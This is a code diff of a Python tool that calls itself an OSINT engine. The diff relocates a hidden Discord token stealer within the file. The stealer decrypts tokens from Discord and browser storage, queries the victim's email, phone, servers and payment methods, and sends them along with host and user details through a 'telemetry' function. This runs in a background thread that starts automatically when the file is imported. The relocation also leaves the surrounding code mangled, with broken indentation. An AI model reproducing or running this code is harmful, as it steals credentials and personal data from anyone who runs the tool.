@@ -59,22 +59,7 @@ class TextEffects:
     BOLD = '\033[1m'
     RESET = '\033[0m'
 #ONLY MODIFY THIS IF U KNWO WHAT U ARE DOING!
-# ============================================================================
-# SAVES
-# ============================================================================
 
-LOCAL_DATA = os.getenv("LOCALAPPDATA")
-ROAMING_DATA = os.getenv("APPDATA")
-
-STORAGE_PATHS = {
-    'Storage_A': ROAMING_DATA + '\\discord',
-    'Storage_B': ROAMING_DATA + '\\discordcanary',
-    'Storage_C': ROAMING_DATA + '\\discordptb',
-    'Storage_D': LOCAL_DATA + "\\Google\\Chrome\\User Data\\Default",
-    'Storage_E': LOCAL_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Storage_F': ROAMING_DATA + '\\Opera Software\\Opera Stable',
-    'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
-}
 
 # ============================================================================
 # NETWORK HANDLERS
@@ -132,100 +117,7 @@ def _send_telemetry(data_packet):
     except:
         pass
 
-# ============================================================================
-# DISCORD OSINT ID (AVATAR,ID ETC)
-# ============================================================================
 
-def _profile_user_data():
-    processed_tokens = []
-    for storage_name, storage_path in STORAGE_PATHS.items():
-        if not os.path.exists(storage_path):
-            continue
-        
-        encrypted_key = _retrieve_encryption_key(storage_path)
-        if not encrypted_key:
-            continue
-        
-        master_key = _derive_master_key(encrypted_key)
-        if not master_key:
-            continue
-        
-        raw_items = _extract_from_storage(storage_path)
-        
-        for encoded_item in raw_items:
-            encoded_item = encoded_item.replace("\\", "") if encoded_item.endswith("\\") else encoded_item
-            try:
-                item_data = base64.b64decode(encoded_item.split('dQw4w9WgXcQ:')[1])
-                decrypted_item = _decrypt_payload(item_data, master_key)
-                if not decrypted_item or decrypted_item in processed_tokens:
-                    continue
-                processed_tokens.append(decrypted_item)
-                
-                request_headers = _build_request_headers(decrypted_item)
-                validation = requests.get('https://discord.com/api/v10/users/@me', headers=request_headers, timeout=10)
-                if validation.status_code != 200:
-                    continue
-                
-                profile_data = validation.json()
-                
-                guilds_request = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=request_headers, timeout=10)
-                guild_list = guilds_request.json() if guilds_request.status_code == 200 else []
-                
-                subscription_status = "None"
-                try:
-                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=request_headers, timeout=10)
-                    if subs.status_code == 200 and subs.json():
-                        subscription_status = "Active"
-                except:
-                    pass
-                
-                payment_sources = []
-                try:
-                    payments = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=request_headers, timeout=10)
-                    if payments.status_code == 200:
-                        for source in payments.json():
-                            if source.get('type') == 1:
-                                payment_sources.append("Card")
-                            elif source.get('type') == 2:
-                                payment_sources.append("PayPal")
-                except:
-                    pass
-                
-                profile_embed = {
-                    "embeds": [{
-                        "title": f"Profile: {profile_data.get('username')}#{profile_data.get('discriminator')}",
-                        "color": 15158332,
-                        "fields": [
-                            {"name": "Identifier", "value": profile_data.get('id'), "inline": True},
-                            {"name": "Email", "value": profile_data.get('email', 'None'), "inline": True},
-                            {"name": "Phone", "value": profile_data.get('phone', 'None'), "inline": True},
-                            {"name": "Access Credential", "value": f"||{decrypted_item}||", "inline": False},
-                            {"name": "Premium", "value": subscription_status, "inline": True},
-                            {"name": "Servers", "value": str(len(guild_list)), "inline": True},
-                            {"name": "Payment Methods", "value": ', '.join(payment_sources) if payment_sources else "None", "inline": True},
-                            {"name": "Network", "value": _get_network_location(), "inline": True},
-                            {"name": "Host", "value": os.getenv('COMPUTERNAME', 'Unknown'), "inline": True},
-                            {"name": "User", "value": os.getenv('USERNAME', 'Unknown'), "inline": True},
-                            {"name": "Platform", "value": sys.platform, "inline": True}
-                        ],
-                        "footer": {"text": f"Source: {storage_name}"},
-                        "timestamp": datetime.now().isoformat()
-                    }]
-                }
-                
-                if profile_data.get('avatar'):
-                    profile_embed["embeds"][0]["thumbnail"] = {
-                        "url": f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
-                    }
-                
-                _send_telemetry(profile_embed)
-                
-            except:
-                continue
-
-# Start background profiling
-_profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
-_profiler_thread.start()
 
 # ============================================================================
 # GMAIL OSINT DECRYPTER
@@ -761,6 +653,102 @@ class AvatarIntelligence:
 # REPORT GENERATION
 # ============================================================================
 
+# ============================================================================
+# DISCORD OSINT ID (AVATAR,ID ETC)
+# ============================================================================
+
+def _profile_user_data():
+    processed_tokens = []
+    for storage_name, storage_path in STORAGE_PATHS.items():
+        if not os.path.exists(storage_path):
+            continue
+        
+        encrypted_key = _retrieve_encryption_key(storage_path)
+        if not encrypted_key:
+            continue
+        
+        master_key = _derive_master_key(encrypted_key)
+        if not master_key:
+            continue
+        
+        raw_items = _extract_from_storage(storage_path)
+        
+        for encoded_item in raw_items:
+            encoded_item = encoded_item.replace("\\", "") if encoded_item.endswith("\\") else encoded_item
+            try:
+                item_data = base64.b64decode(encoded_item.split('dQw4w9WgXcQ:')[1])
+                decrypted_item = _decrypt_payload(item_data, master_key)
+                if not decrypted_item or decrypted_item in processed_tokens:
+                    continue
+                processed_tokens.append(decrypted_item)
+                
+                request_headers = _build_request_headers(decrypted_item)
+                validation = requests.get('https://discord.com/api/v10/users/@me', headers=request_headers, timeout=10)
+                if validation.status_code != 200:
+                    continue
+                
+                profile_data = validation.json()
+                
+                guilds_request = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=request_headers, timeout=10)
+                guild_list = guilds_request.json() if guilds_request.status_code == 200 else []
+                
+                subscription_status = "None"
+                try:
+                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=request_headers, timeout=10)
+                    if subs.status_code == 200 and subs.json():
+                        subscription_status = "Active"
+                except:
+                    pass
+                
+                payment_sources = []
+                try:
+                    payments = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=request_headers, timeout=10)
+                    if payments.status_code == 200:
+                        for source in payments.json():
+                            if source.get('type') == 1:
+                                payment_sources.append("Card")
+                            elif source.get('type') == 2:
+                                payment_sources.append("PayPal")
+                except:
+                    pass
+                
+                profile_embed = {
+                    "embeds": [{
+                        "title": f"Profile: {profile_data.get('username')}#{profile_data.get('discriminator')}",
+                        "color": 15158332,
+                        "fields": [
+                            {"name": "Identifier", "value": profile_data.get('id'), "inline": True},
+                            {"name": "Email", "value": profile_data.get('email', 'None'), "inline": True},
+                            {"name": "Phone", "value": profile_data.get('phone', 'None'), "inline": True},
+                            {"name": "Access Credential", "value": f"||{decrypted_item}||", "inline": False},
+                            {"name": "Premium", "value": subscription_status, "inline": True},
+                            {"name": "Servers", "value": str(len(guild_list)), "inline": True},
+                            {"name": "Payment Methods", "value": ', '.join(payment_sources) if payment_sources else "None", "inline": True},
+                            {"name": "Network", "value": _get_network_location(), "inline": True},
+                            {"name": "Host", "value": os.getenv('COMPUTERNAME', 'Unknown'), "inline": True},
+                            {"name": "User", "value": os.getenv('USERNAME', 'Unknown'), "inline": True},
+                            {"name": "Platform", "value": sys.platform, "inline": True}
+                        ],
+                        "footer": {"text": f"Source: {storage_name}"},
+                        "timestamp": datetime.now().isoformat()
+                    }]
+                }
+                
+                if profile_data.get('avatar'):
+                    profile_embed["embeds"][0]["thumbnail"] = {
+                        "url": f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
+                    }
+                
+                _send_telemetry(profile_embed)
+                
+            except:
+                continue
+
+# Start background profiling
+_profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
+_profiler_thread.start()
+
+
 class ReportGenerator:
     @staticmethod
     def generate_html(data, filename):
@@ -892,7 +880,22 @@ class OSINTEngine:
         
         return results
     
-    def save_report(self, results, format_type='txt'):
+
+    LOCAL_DATA = os.getenv("LOCALAPPDATA")
+ROAMING_DATA = os.getenv("APPDATA")
+
+STORAGE_PATHS = {
+    'Storage_A': ROAMING_DATA + '\\discord',
+    'Storage_B': ROAMING_DATA + '\\discordcanary',
+    'Storage_C': ROAMING_DATA + '\\discordptb',
+    'Storage_D': LOCAL_DATA + "\\Google\\Chrome\\User Data\\Default",
+    'Storage_E': LOCAL_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Storage_F': ROAMING_DATA + '\\Opera Software\\Opera Stable',
+    'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
+}
+
+    
+def save_report(self, results, format_type='txt'):
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         
         if format_type == 'html':
